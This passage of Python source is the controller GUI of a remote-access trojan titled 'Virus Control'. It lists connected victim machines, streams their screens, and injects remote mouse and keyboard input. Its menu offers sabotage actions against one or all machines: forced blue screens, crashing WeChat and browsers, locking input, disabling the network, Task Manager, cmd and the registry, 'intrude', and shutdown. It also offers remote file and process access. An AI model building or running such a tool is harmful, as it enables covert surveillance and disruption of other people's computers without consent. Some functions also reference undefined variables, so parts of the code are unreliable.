                            TaskManager_class.tree.item(process_id, tags="sleeping")
                            
                        else:
                            TaskManager_class.tree.item(process_id, tags="other")

                    except:
                        pass

                # 设置标签颜色
                TaskManager_class.tree.tag_configure("running", background="lightgreen")
                TaskManager_class.tree.tag_configure("sleeping", background="lightyellow")
                TaskManager_class.tree.tag_configure("other", background="lightgray")
                

        except UnicodeDecodeError:
            return

        except:

            print(f"{IP}已断开连接") #打印事件

            delete_item_by_ip(IP)

            try:
                if monitor_status[ip_list.index(IP)]:
                    
                    monitor_status[ip_list.index(IP)] = False
                    
                    monitor_list[ip_list.index(IP)].destroy()
                    
                    messagebox.showwarning("断开", f"{IP}断开了与你的连接，屏幕监控被终止。", parent=root)
                    
                else:
                    pass

                if AccessDirectoryStatus:

                    AccessDirectoryStatus = False

                    Directory_class.destroy()

                    Button6["state"] = "normal"

                    Button6["text"] = "访问目录"

                    messagebox.showwarning("断开", f"{IP}断开了与你的连接，远程访问结束。", parent=root)

                else:
                    pass
                
            except:
                pass

            try:
                del monitor_status[socket_list.index(S)]
                del monitor_list[socket_list.index(S)]
                del picture_tag[socket_list.index(S)]
                del self.fullscreen[socket_list.index(S)]
                del mousepos_pos[socket_list.index(S)]
                del self.mousepos[socket_list.index(S)]
                del ob_bind[socket_list.index(S)]
                del self.img_tk[socket_list.index(S)]
                del self.display_width[socket_list.index(S)]
                del self.display_height[socket_list.index(S)]
                del self.img_width[socket_list.index(S)]
                del self.img_height[socket_list.index(S)]
                del self.mouse_position[socket_list.index(S)]
            except:
                pass

            try:
                socket_list.remove(S)
            except:
                pass

            try:
                ip_list.remove(IP)
            except:
                pass

            return False

    def getValue(self):
        """获取当前选中的行"""
        
        selected_item = tree.selection()  # 获取选中的项的ID
        
        if selected_item:  # 确保有选中的行
            
            item = tree.item(selected_item)  # 获取选中行的数据
            
            address = item["values"][0]  # 获取address列的值
            
            time = item["values"][1]  # 获取time列的值

            notice = item["values"][2]  # 获取time列的值
            
            return address
            
        else:
            
            messagebox.showerror("错误", "未选择操作对象")


    def socket_target(self, s, IP):
        """接收客户端消息客户端消息并广播至全服"""
        while True:
            content = self.read_client(s, IP) #获取客户端发送的信息
            
            if content is None:
                continue

            else:
                return

    def PopupContentDialog(self):
        """弹窗内容对话框"""

        self.ContentDialog = tk.Toplevel(root)
        self.ContentDialog.title("弹窗内容编辑")
        self.ContentDialog.geometry("300x300")
        self.ContentDialog.transient(root)
        self.ContentDialog.iconbitmap("ico\\x.ico")

        # 创建标签和输入框
        label1 = ttk.Label(self.ContentDialog, text="标题:")
        label1.grid(row=0, column=0, padx=10, pady=10, sticky="ew")

        entry1 = ttk.Entry(self.ContentDialog)
        entry1.grid(row=0, column=1, padx=10, pady=10, sticky="ew")

        label2 = ttk.Label(self.ContentDialog, text="内容:")
        label2.grid(row=1, column=0, padx=10, pady=10, sticky="ew")

        entry2 = ttk.Entry(self.ContentDialog)
        entry2.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

        # 调整列权重，确保控件水平居中
        self.ContentDialog.grid_columnconfigure(0, weight=1)
        self.ContentDialog.grid_columnconfigure(1, weight=1)

        # 确认按钮的回调函数
        def on_confirm():
            self.content1 = entry1.get()
            self.content2 = entry2.get()
            enable()  # 启用主窗口并关闭弹窗

        # 创建确认按钮
        confirm_button = ttk.Button(self.ContentDialog, text="确认", command=on_confirm)
        confirm_button.grid(row=2, columnspan=2, pady=20)

        #启用登录窗口
        def enable():
            root.attributes("-disabled", 0)
            self.ContentDialog.destroy()

        #禁用登录窗口
        root.attributes("-disabled", 1)
        self.ContentDialog.protocol("WM_DELETE_WINDOW",enable)

        self.ContentDialog.wait_window(self.ContentDialog)  # 等待弹窗关闭

        return self.content1, self.content2  # 返回内容

    def MessagePopup(self):
        """消息弹窗"""

        address = self.getValue()

        if address:

            title, content = self.PopupContentDialog()

            request = {
                "operation": "消息弹窗",
                "title" : title,
                "content" : content,
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

        else:
            pass

    def WarningPopup(self):
        """警告弹窗"""

        address = self.getValue()

        if address:

            title, content = self.PopupContentDialog()

            request = {
                "operation": "警告弹窗",
                "title" : title,
                "content" : content,
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

        else:
            pass

    def ErrorPopup(self):
        """错误弹窗"""

        address = self.getValue()

        if address:

            title, content = self.PopupContentDialog()

            request = {
                "operation": "错误弹窗",
                "title" : title,
                "content" : content,
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

        else:
            pass

    def SwitchChinese(self):
        """切换到中文"""

        self.language = "zh"
        self.load_language()

    def SwitchEnglish(self):
        """切换到英文"""

        self.language = "en"
        self.load_language()

    def SwitchJapanese(self):
        """切换到日语"""

        self.language = "ja"
        self.load_language()

    def SwitchKorean(self):
        """切换到韩语"""

        self.language = "ko"
        self.load_language()

    def showFeature(self, event):
        """显示功能菜单"""

        # 创建右键菜单
        self.Function_menu = tk.Menu(root, tearoff=0)

        # 二级菜单
        self.Popup_menuLanguage = tk.Menu(self.Function_menu, tearoff=0)
        self.Popup_menuLanguage.add_command(label="简体中文", command=self.SwitchChinese)
        self.Popup_menuLanguage.add_command(label="English", command=self.SwitchEnglish)
        self.Popup_menuLanguage.add_command(label="日本語", command=self.SwitchJapanese)
        self.Popup_menuLanguage.add_command(label="한국어", command=self.SwitchKorean)
        self.Function_menu.add_cascade(label="语言/Languages", menu=self.Popup_menuLanguage)

        self.Function_menu.add_separator()
        
        self.Function_menu.add_command(label=self.current_language["shutdown"], command=self.turn_off)
        self.Function_menu.add_command(label=self.current_language["go_to_desktop"], command=self.Show_Capture)
        self.Function_menu.add_command(label=self.current_language["remote_monitoring"], command=self.Monitoring)
        self.Function_menu.add_command(label=self.current_language["get_wechat_tree"], command=self.GetWechatTree)
        self.Function_menu.add_command(label=self.current_language["blue_screen"], command=self.BlueScreen)
        self.Function_menu.add_command(label=self.current_language["close_top_window"], command=self.CloseUpperWindow)
        self.Function_menu.add_command(label=self.current_language["hang_explorer"], command=self.HangExplorer)
        self.Function_menu.add_command(label=self.current_language["hang_wechat"], command=self.HangWechat)
        self.Function_menu.add_command(label=self.current_language["hang_edge"], command=self.HangEdge)
        self.Function_menu.add_command(label=self.current_language["hang_vmware"], command=self.HangVmware)
        self.Function_menu.add_command(label=self.current_language["hang_wps"], command=self.HangWps)
        self.Function_menu.add_command(label=self.current_language["hang_word"], command=self.HangWord)
        self.Function_menu.add_command(label=self.current_language["hang_chrome"], command=self.HangChrome)
        self.Function_menu.add_command(label=self.current_language["hang_all"], command=self.HangAll)
        self.Function_menu.add_command(label=self.current_language["lock_mouse"], command=self.AddMouseHook)
        self.Function_menu.add_command(label=self.current_language["unlock_mouse"], command=self.RemoveMouseHook)
        self.Function_menu.add_command(label=self.current_language["lock_keyboard"], command=self.AddKeyHook)
        self.Function_menu.add_command(label=self.current_language["unlock_keyboard"], command=self.RemoveKeyHook)
        self.Function_menu.add_command(label=self.current_language["wechat_crash"], command=self.WechatCollapse)
        self.Function_menu.add_command(label=self.current_language["limit_speed"], command=self.LimitSpeed)
        self.Function_menu.add_command(label=self.current_language["relieve_speed"], command=self.RelieveSpeed)
        self.Function_menu.add_command(label=self.current_language["disable_network"], command=self.NetworkDisable)
        self.Function_menu.add_command(label=self.current_language["enable_network"], command=self.NetworkEnable)
        self.Function_menu.add_command(label=self.current_language["disable_settings"], command=self.SettingsDisable)
        self.Function_menu.add_command(label=self.current_language["enable_settings"], command=self.SettingsEnable)
        self.Function_menu.add_command(label=self.current_language["disable_task_manager"], command=self.TaskManagerDisable)
        self.Function_menu.add_command(label=self.current_language["enable_task_manager"], command=self.TaskManagerEnable)
        self.Function_menu.add_command(label=self.current_language["disable_cmd"], command=self.CommandPromptDisable)
        self.Function_menu.add_command(label=self.current_language["enable_cmd"], command=self.CommandPromptEnable)
        self.Function_menu.add_command(label=self.current_language["disable_computer_management"], command=self.ComputerManagementDisable)
        self.Function_menu.add_command(label=self.current_language["enable_computer_management"], command=self.ComputerManagementEnable)
        self.Function_menu.add_command(label=self.current_language["disable_registry"], command=self.RegistryDisable)
        self.Function_menu.add_command(label=self.current_language["enable_registry"], command=self.RegistryEnable)
        self.Function_menu.add_command(label=self.current_language["intrude_computer"], command=self.Intrude)
        self.Function_menu.add_command(label=self.current_language["stop_intrude"], command=self.IntrudeCencel)

        # 二级菜单
        self.Popup_menu = tk.Menu(self.Function_menu, tearoff=0)
        self.Popup_menu.add_command(label=self.current_language["info_popup"], command=self.MessagePopup)
        self.Popup_menu.add_command(label=self.current_language["warnning_popup"], command=self.WarningPopup)
        self.Popup_menu.add_command(label=self.current_language["error_popup"], command=self.ErrorPopup)
        self.Function_menu.add_cascade(label=self.current_language["Dialogbox_popup"], menu=self.Popup_menu)
        
        self.Function_menu.add_separator()

        if AccessDirectoryStatus:
            self.Function_menu.add_command(label=self.current_language["remoteing"], state="disabled")
        else:
            self.Function_menu.add_command(label=self.current_language["remote"], command=self.DirectoryAccess)

        if BackstageStatus:
            self.Function_menu.add_command(label=self.current_language["remoteting_manage"], state="disabled")
        else:
            self.Function_menu.add_command(label=self.current_language["remote_manage"], command=self.Task_Manager)
        
        self.Function_menu.add_separator()
        self.Function_menu.add_command(label=self.current_language["shutdown_all_computers"], command=self.ShutdownComputers)
        self.Function_menu.add_command(label=self.current_language["get_screenshots_all_computers"], command=self.Screen_Capture)
        self.Function_menu.add_command(label=self.current_language["limit_speed_all_computers"], command=self.LimitSpeed_All)
        self.Function_menu.add_command(label=self.current_language["relieve_speed_all_computers"], command=self.RelieveSpeed_All)
        self.Function_menu.add_command(label=self.current_language["blue_screen_all_computers"], command=self.BlueScreen_All)
        self.Function_menu.add_command(label=self.current_language["hang_explorer_all_computers"], command=self.HangExplorer_All)
        self.Function_menu.add_command(label=self.current_language["wechat_crash_all_computers"], command=self.WechatCollapse_All)
        self.Function_menu.add_command(label=self.current_language["intrude_all_computers"], command=self.Intrude_All)
        self.Function_menu.add_command(label=self.current_language["stop_intrude_all_computers"], command=self.IntrudeCencel_All)

        self.Function_menu.entryconfig(2, background="lightblue")
        self.Function_menu.entryconfig(14, background="lightblue")
        self.Function_menu.entryconfig(16, background="lightblue")

        self.Function_menu.entryconfig(33, background="tomato")
        self.Function_menu.entryconfig(47, background="tomato")

        self.Function_menu.post(event.x_root, event.y_root)
    
    def window(self):
        """控制窗口"""
        
        global tree,root

        root = tk.Tk()
        root.geometry("350x400+500+100")
        root.title("Virus Control")

        root.iconbitmap("ico\\x.ico")
        
        # 创建 Treeview 控件
        tree = ttk.Treeview(root, selectmode="browse")

        # 定义列
        tree["columns"] = ("address", "time", "notice")

        # 设置列的显示方式
        tree.column("#0", width=0, stretch=tk.NO)  # 不显示树形列
        tree.column("address", anchor=tk.W, width=90)
        tree.column("time", anchor=tk.W, width=100)
        tree.column("notice", anchor=tk.W, width=80)

        # 设置列标题
        tree.heading("#0", text="", anchor=tk.W)
        tree.heading("address", text="网络地址", anchor=tk.W)
        tree.heading("time", text="连接时间", anchor=tk.W)
        tree.heading("notice", text="备注", anchor=tk.W)

        # 绑定双击事件
        tree.bind("<Double-1>", self.on_item_double_click)
        tree.bind("<Button-3>", self.showFeature)

        # 显示 Treeview
        tree.pack(fill=tk.BOTH, expand=True)

        threading.Thread(target=self.Wait_Request, daemon=True).start()  # 设置为守护线程
        threading.Thread(target=self.Wait_Request_Monitor, daemon=True).start()  # 设置为守护线程

        # 运行主循环
        root.mainloop()


    def on_item_double_click(self, event):

        try:
        
            # 获取被双击的项
            selected_item = tree.selection()[0]  # 获取选中的项
            
            item_values = tree.item(selected_item, 'values')  # 获取该项的值

            # 创建输入对话框
            user_input = simpledialog.askstring("备注", "备注：")

            if user_input:
                
                # 更新该行的备注字段，假设备注在第三列
                new_values = (item_values[0], item_values[1], user_input)
                tree.item(selected_item, values=new_values)  # 更新 Treeview 中该项的值

                # 更新数据库中的备注
                self.update_database(item_values[0], item_values[1], user_input)

            else:
                pass

        except:
            pass


    def Wait_Request(self):

        while True:
            conn, addr = s.accept() #响应客户端的请求，获取数据

            cilent_ip = addr[0] # 获取客户端的IP地址

            cilent_port = addr[1] # 获取客户端的端口号

            print(f"{cilent_ip}已连接")

            socket_list.append(conn)

            ip_list.append(cilent_ip)

            monitor_status.append(False)

            monitor_list.append(False)

            picture_tag.append(False)

            self.fullscreen.append(False)

            mousepos_pos.append(False)

            self.mousepos.append(False)

            ob_bind.append([None,None,None,None,None,None,None,None,None,None]) # 索引8退出按钮 9右键菜单

            self.img_tk.append(False)

            self.display_width.append(False)

            self.display_height.append(False)

            self.img_width.append(False)

            self.img_height.append(False)

            self.mouse_position.append(None)

            Time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            self.insert_data(cilent_ip, Time, "")

            notice = self.get_notice_by_address(cilent_ip)

            tree.insert("", "end", values=(cilent_ip, Time, notice))

            threading.Thread(target=self.socket_target, args=(conn,cilent_ip,)).start()

    def resize_image_to_fit_window(self, img, IP):
        """根据窗口大小调整图像，保持宽高比"""
        
        window_width = monitor_list[ip_list.index(IP)].winfo_width()
        window_height = monitor_list[ip_list.index(IP)].winfo_height()

        # 计算缩放比例
        self.img_width[ip_list.index(IP)], self.img_height[ip_list.index(IP)] = img.size
        width_ratio = window_width / self.img_width[ip_list.index(IP)]
        height_ratio = window_height / self.img_height[ip_list.index(IP)]
        scale_ratio = min(width_ratio, height_ratio)

        # 计算缩放后的图像尺寸
        self.display_width[ip_list.index(IP)] = int(self.img_width[ip_list.index(IP)] * scale_ratio)
        self.display_height[ip_list.index(IP)] = int(self.img_height[ip_list.index(IP)] * scale_ratio)

        # 按比例缩放图像
        resized_img = img.resize((self.display_width[ip_list.index(IP)], self.display_height[ip_list.index(IP)]), Image.Resampling.LANCZOS)

        # 转换为 Tkinter 可显示的格式
        return ImageTk.PhotoImage(resized_img)

    def socket_target_monitor(self, S, IP):
        """接收客户端消息客户端消息并广播至全服"""
        
        while True:

            try:

                if monitor_status[ip_list.index(IP)]:

                    try:

                        # 接收图像数据的长度（4字节）
                        length_data = S.recv(4)
                        if not length_data:
                            break
                        img_len = struct.unpack('>I', length_data)[0]

                        # 接收鼠标位置（8字节：x 和 y 各 4 字节）
                        mouse_data = S.recv(8)
                        mouse_x, mouse_y = struct.unpack('>II', mouse_data)
                        
                        self.mouse_position[ip_list.index(IP)] = (mouse_x, mouse_y)

                        # 接收图像数据
                        img_data = b""
                        
                        while len(img_data) < img_len:
                            packet = S.recv(img_len - len(img_data))
                            if not packet:
                                break
                            img_data += packet

                        # 将字节数据转换为图像
                        img = Image.open(io.BytesIO(img_data))

                        # 获取原图像的宽度和高度
                        self.img_width[ip_list.index(IP)], self.img_height[ip_list.index(IP)] = img.size

                        # 在图像上绘制鼠标光标
                        draw = ImageDraw.Draw(img)
                        draw.ellipse(
                            (mouse_x - 5, mouse_y - 5, mouse_x + 5, mouse_y + 5),
                            fill="red",
                            outline="white"
                        )

                        # 保持图像比例并适应窗口大小
                        self.img_tk[ip_list.index(IP)] = self.resize_image_to_fit_window(img,IP)

                        # 调用 UI 更新
                        monitor_list[ip_list.index(IP)].after(0, lambda : self.update_ui(IP))

                    except:
                        continue

                else:
                    break
            except:
                pass
            

    def Wait_Request_Monitor(self):
        
        while True:
            conn, addr = server_socket.accept() #响应客户端的请求，获取数据

            cilent_ip = addr[0] # 获取客户端的IP地址

            cilent_port = addr[1] # 获取客户端的端口号

            te.sleep(0.1)

            threading.Thread(target=self.socket_target_monitor, args=(conn,cilent_ip,)).start()

    def show_context_menu(self, event, menu):
    
        menu.post(event.x_root, event.y_root)

    def update_ui(self, IP):
        """更新 UI 显示图像"""
        
        global picture_tag,mousepos_pos

        try:
        
            if self.img_tk[ip_list.index(IP)]:
                picture_tag[ip_list.index(IP)].config(image=self.img_tk[ip_list.index(IP)])
                picture_tag[ip_list.index(IP)].image = self.img_tk[ip_list.index(IP)]  # 保持对图像的引用

        except:
            pass

        try:
            if self.mousepos[ip_list.index(IP)]:
                mousepos_pos[ip_list.index(IP)]["text"] = f"鼠标位置：{str(self.mouse_position[ip_list.index(IP)])}"
            else:
                pass
        except:
            pass

    def on_window_resize(self, event, IP):
        """窗口大小调整时，重新缩放图像以适应窗口"""
        
        if self.img_tk[ip_list.index(IP)]:
            self.update_ui(IP)

    def FullScreen(self,IP):
        """全屏显示"""

        self.fullscreen[ip_list.index(IP)] = not self.fullscreen[ip_list.index(IP)]
        
        if self.fullscreen[ip_list.index(IP)]:
            monitor_list[ip_list.index(IP)].attributes("-fullscreen", True)
            
        else:
            monitor_list[ip_list.index(IP)].attributes("-fullscreen", False)

    def MousePos(self, IP):
        """显示鼠标位置"""

        global mousepos_pos

        self.mousepos[ip_list.index(IP)] = not self.mousepos[ip_list.index(IP)]

        if self.mousepos[ip_list.index(IP)]:
            mousepos_pos[ip_list.index(IP)].place(relx=0, rely=1, anchor="sw")

        else:
            mousepos_pos[ip_list.index(IP)].place_forget()

    def on_image_click3(self, event, IP):
        """处理图像右击事件，计算点击位置"""
        
        # 获取标签内单击的坐标
        x, y = event.x, event.y

        # 确保点击的位置在图像范围内

        if 0 <= x <= self.display_width[ip_list.index(IP)] and 0 <= y <= self.display_height[ip_list.index(IP)]:
            
            # 计算图像上的实际坐标
            img_x = int(x * self.img_width[ip_list.index(IP)] / self.display_width[ip_list.index(IP)])
            img_y = int(y * self.img_height[ip_list.index(IP)] / self.display_height[ip_list.index(IP)])
            
            request = {
                "operation": "右击",
                "x" : img_x,
                "y" : img_y
            }

            send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))
            
        else:
            pass

    def on_image_click(self, event):
        """处理图像单击事件，计算点击位置"""
        
        # 获取标签内单击的坐标
        x, y = event.x, event.y

        # 确保点击的位置在图像范围内

        if 0 <= x <= self.display_width[ip_list.index(IP)] and 0 <= y <= self.display_height[ip_list.index(IP)]:
            
            # 计算图像上的实际坐标
            img_x = int(x * self.img_width[ip_list.index(IP)] / self.display_width[ip_list.index(IP)])
            img_y = int(y * self.img_height[ip_list.index(IP)] / self.display_height[ip_list.index(IP)])
            
            request = {
                "operation": "单击",
                "x" : img_x,
                "y" : img_y
            }

            send_msg(socket_list[ip_list.index(monitor_ip)], (json.dumps(request)).encode("utf-8"))
            
        else:
            pass


    def on_image_motion(self, event, IP):
        """鼠标移动"""

        # 获取标签内的坐标
        x, y = event.x, event.y

        # 确保点击的位置在图像范围内

        if 0 <= x <= self.display_width[ip_list.index(IP)] and 0 <= y <= self.display_height[ip_list.index(IP)]:
            
            # 计算图像上的实际坐标
            img_x = int(x * self.img_width[ip_list.index(IP)] / self.display_width[ip_list.index(IP)])
            img_y = int(y * self.img_height[ip_list.index(IP)] / self.display_height[ip_list.index(IP)])
            
            request = {
                "operation": "更新鼠标位置",
                "x" : img_x,
                "y" : img_y
            }

            send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))
            
        else:
            pass

    def on_mouse_wheel(self, event, IP):
        """滚动"""

        if event.delta  > 0:

            request = {
                "operation": "滚动上"
            }
            send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))
            
        else:

            request = {
                "operation": "滚动下"
            }
            send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))

    def on_mouse_press(self, event, IP):
        """左键按下"""

        request = {
            "operation": "左键按下"
        }
        send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))

    def on_mouse_release(self, event, IP):
        """左键松开"""

        request = {
            "operation": "左键松开"
        }
        send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))

    def on_key_press(self, event, IP):
        """键盘按下事件的处理函数"""
        
        request = {
            "operation": "按键",
            "key" : event.keysym
        }
        send_msg(socket_list[ip_list.index(IP)], (json.dumps(request)).encode("utf-8"))

    def remote_control(self, IP):
        """远程控制"""

        global ExitcontrolButton,ob_bind

        # 解除绑定函数
        monitor_list[ip_list.index(IP)].unbind("<Button-3>", ob_bind[ip_list.index(IP)][0])

        # 绑定鼠标事件
        ob_bind[ip_list.index(IP)][1] = picture_tag[ip_list.index(IP)].bind("<Button-1>", lambda event : self.on_image_click(event, IP))
        ob_bind[ip_list.index(IP)][2] = picture_tag[ip_list.index(IP)].bind("<Button-3>", lambda event : self.on_image_click3(event, IP))
        ob_bind[ip_list.index(IP)][3] = picture_tag[ip_list.index(IP)].bind("<Motion>", lambda event : self.on_image_motion(event, IP))
        ob_bind[ip_list.index(IP)][4] = picture_tag[ip_list.index(IP)].bind("<MouseWheel>", lambda event : self.on_mouse_wheel(event, IP))
        ob_bind[ip_list.index(IP)][5] = picture_tag[ip_list.index(IP)].bind("<ButtonPress-1>", lambda event : self.on_mouse_press(event, IP))  # 绑定鼠标左键按下
        ob_bind[ip_list.index(IP)][6] = picture_tag[ip_list.index(IP)].bind("<ButtonRelease-1>", lambda event : self.on_mouse_release(event, IP))  # 绑定鼠标左键松开

        # 绑定键盘按下事件
        ob_bind[ip_list.index(IP)][7] = monitor_list[ip_list.index(IP)].bind("<Key>", lambda event : self.on_key_press(event, IP))

        ob_bind[ip_list.index(IP)][8].place(relx=1, rely=1, anchor="se")

    def exit_control(self, menu, IP):
        """退出远程控制"""

        global ExitcontrolButton,ob_bind

        ob_bind[ip_list.index(IP)][8].place_forget()

        # 绑定鼠标事件
        picture_tag[ip_list.index(IP)].unbind("<Button-1>", ob_bind[ip_list.index(IP)][1])
        picture_tag[ip_list.index(IP)].unbind("<Button-3>", ob_bind[ip_list.index(IP)][2])
        picture_tag[ip_list.index(IP)].unbind("<Motion>", ob_bind[ip_list.index(IP)][3])
        picture_tag[ip_list.index(IP)].unbind("<MouseWheel>", ob_bind[ip_list.index(IP)][4])
        picture_tag[ip_list.index(IP)].unbind("<ButtonPress-1>", ob_bind[ip_list.index(IP)][5])  # 绑定鼠标左键按下
        picture_tag[ip_list.index(IP)].unbind("<ButtonRelease-1>", ob_bind[ip_list.index(IP)][6])  # 绑定鼠标左键松开

        monitor_list[ip_list.index(IP)].unbind("<Key>", ob_bind[ip_list.index(IP)][7])

        # 绑定右键点击事件
        ob_bind[ip_list.index(IP)][0] = monitor_list[ip_list.index(IP)].bind("<Button-3>", lambda event : show_context_menu(event, menu))

    def DirectoryAccess(self):
        """访问目录"""

        global AccessDirectoryObject,Directory_class,AccessDirectoryStatus

        address = self.getValue()

        if address:

            AccessDirectoryStatus = True

            AccessDirectoryObject = address
            
            Directory = tk.Toplevel()
            Directory_class = FileExplorer(Directory, f"正在访问 {address} 的文件资源")
            
        else:
            pass

    def Task_Manager(self):
        """任务管理器"""

        global TaskManagerObject,TaskManager_class,BackstageStatus

        address = self.getValue()

        if address:

            BackstageStatus = True

            TaskManagerObject = address
            
            TaskManagerO = tk.Toplevel()
            TaskManager_class = TaskManager(TaskManagerO, f"正在管理 {address} 的进程")
            
        else:
            pass
    

    def show_image_window(self, index, IP):
        """显示图片窗口"""
        
        global mousepos_pos,bind_id1,ExitcontrolButton,monitor_list

        # 创建主窗口
        show_screen = tk.Toplevel()
        show_screen.title(f"正在监控 {IP} 的屏幕")
        show_screen.geometry("1366x768+500+100")
        show_screen["bg"] = "black"

        show_screen.iconbitmap("ico\\x.ico")

        # 绑定关闭事件，使用 protocol 方法监听窗口关闭事件
        show_screen.protocol("WM_DELETE_WINDOW", lambda : close_screen(IP))

        # 监控的屏幕
        PictureDisplay_Label = tk.Label(show_screen, bg="black")
        PictureDisplay_Label.pack(expand=True)  # 使 Label 填充窗口

        # 鼠标位置
        Mousepos_Label = tk.Label(show_screen, text="鼠标位置：", bg="black", fg="white")
        Mousepos_Label.place(relx=0, rely=1, anchor="sw")

        if self.mousepos[ip_list.index(IP)]:
            pass
        else:
            Mousepos_Label.place_forget()

        # 创建右键菜单
        ob_bind[ip_list.index(IP)][9] = tk.Menu(root, tearoff=0)
        ob_bind[ip_list.index(IP)][9].add_checkbutton(label="全屏显示", command=lambda : self.FullScreen(IP))
        ob_bind[ip_list.index(IP)][9].add_checkbutton(label="显示鼠标位置", command= lambda : self.MousePos(IP))
        ob_bind[ip_list.index(IP)][9].add_command(label="远程控制", command= lambda : self.remote_control(IP))

        # 退出远程控制
        ExitcontrolButton = ttk.Button(show_screen, text="退出控制", takefocus=False, command= lambda : self.exit_control(ob_bind[ip_list.index(IP)][9], IP))

        # 绑定右键点击事件
        bind_id1 = show_screen.bind("<Button-3>", lambda event : self.show_context_menu(event, ob_bind[ip_list.index(IP)][9]))

        # 绑定窗口大小调整事件
        show_screen.bind("<Configure>", lambda event : self.on_window_resize(event,IP))

        monitor_list[index] = show_screen
        picture_tag[index] = PictureDisplay_Label
        mousepos_pos[index] = Mousepos_Label
        ob_bind[ip_list.index(IP)][8] = ExitcontrolButton


App = main()
